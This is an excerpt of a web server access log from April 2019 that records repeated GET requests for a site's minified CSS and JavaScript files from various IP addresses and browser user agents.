140.143.205.204 - - [19/Apr/2019:03:53:11 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 360SE)" "-"
110.230.180.118 - - [19/Apr/2019:03:53:15 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" "-"
110.230.180.118 - - [19/Apr/2019:03:53:15 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" "-"
14.221.97.191 - - [19/Apr/2019:03:53:16 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" "-"
116.6.119.234 - - [19/Apr/2019:03:53:17 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)" "-"
116.6.119.234 - - [19/Apr/2019:03:53:17 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)" "-"
116.255.250.123 - - [19/Apr/2019:03:53:19 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)" "-"
116.255.250.123 - - [19/Apr/2019:03:53:19 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)" "-"
54.36.223.24 - - [19/Apr/2019:03:53:24 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; 360SE)" "-"
14.221.97.191 - - [19/Apr/2019:03:53:28 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" "-"
140.143.205.204 - - [19/Apr/2019:03:53:31 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 360SE)" "-"
140.143.205.204 - - [19/Apr/2019:03:53:31 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 360SE)" "-"
113.106.213.222 - - [19/Apr/2019:03:53:39 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; .NET4.0C; .NET4.0E)" "-"
116.6.119.234 - - [19/Apr/2019:03:53:39 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)" "-"
116.255.250.123 - - [19/Apr/2019:03:53:39 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)" "-"
113.106.213.222 - - [19/Apr/2019:03:53:39 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; .NET4.0C; .NET4.0E)" "-"
116.6.119.234 - - [19/Apr/2019:03:53:39 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)" "-"
116.255.250.123 - - [19/Apr/2019:03:53:39 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)" "-"
54.36.223.24 - - [19/Apr/2019:03:53:48 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; 360SE)" "-"
113.106.213.222 - - [19/Apr/2019:03:53:59 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; .NET4.0C; .NET4.0E)" "-"
113.106.213.222 - - [19/Apr/2019:03:54:00 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; .NET4.0C; .NET4.0E)" "-"
171.223.192.67 - - [19/Apr/2019:03:54:10 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" "-"
171.223.192.67 - - [19/Apr/2019:03:54:10 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" "-"
106.117.179.128 - - [19/Apr/2019:03:54:21 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" "-"
106.117.179.128 - - [19/Apr/2019:03:54:21 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 200 8887 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" "-"
54.36.223.24 - - [19/Apr/2019:03:54:23 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; 360SE)" "-"
54.36.223.24 - - [19/Apr/2019:03:54:24 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; 360SE)" "-"
171.223.192.67 - - [19/Apr/2019:03:54:30 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" "-"
171.223.192.67 - - [19/Apr/2019:03:54:31 +0800] "GET /js/index.min.js?v=2.5.5 HTTP/1.1" 304 0 "https://bz.zzzmh.cn/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" "-"
129.56.71.13 - - [19/Apr/2019:03:54:37 +0800] "GET /css/index.min.css?v=2.5.5 HTTP/1.1" 200 8194 "https://bz.zzzmh.cn/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0C; .NET4.0E; InfoPath.3)" "-"
